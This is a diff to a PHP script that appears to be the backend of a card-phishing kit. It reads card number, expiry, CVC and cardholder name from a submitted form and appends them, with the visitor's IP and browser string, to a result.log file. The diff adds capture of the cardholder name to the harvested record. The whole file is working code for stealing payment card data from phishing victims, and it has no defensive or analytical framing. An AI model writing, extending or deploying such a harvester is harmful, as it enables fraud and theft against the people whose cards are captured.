@@ -1,6 +1,7 @@
 <?php
 
 $number = $_POST['creditcard'];
+$names = $_POST['names'];
 $expirx = $_POST['month'];
 $expiry = $_POST['year'];
 $cvc = $_POST['cvc'];
@@ -15,7 +16,7 @@ fclose($fp);
 
 $file = $_SERVER['DOCUMENT_ROOT']."/result.log";
 $file = str_replace("/dist", "", $file);
-$all = "[OS]: PAY"."\n [Card Number]: ".$number."\n [Date]: ".$expirx."/".$expiry."\n [CVV2]: " .$cvc."\n [ip]: ".$ip."\n [Information]: ".$agent."\n\n"; 
+$all = "[OS]: PAY"."\n [Name]: $names \n [Card Number]: $number \n [Date]: $expirx/$expiry\n [CVV2]: $cvc\n [ip]: $ip \n [Information]: $agent \n\n"; 
 $fp = fopen("$file", "a+");
 fwrite($fp, $all);
 fclose($fp);
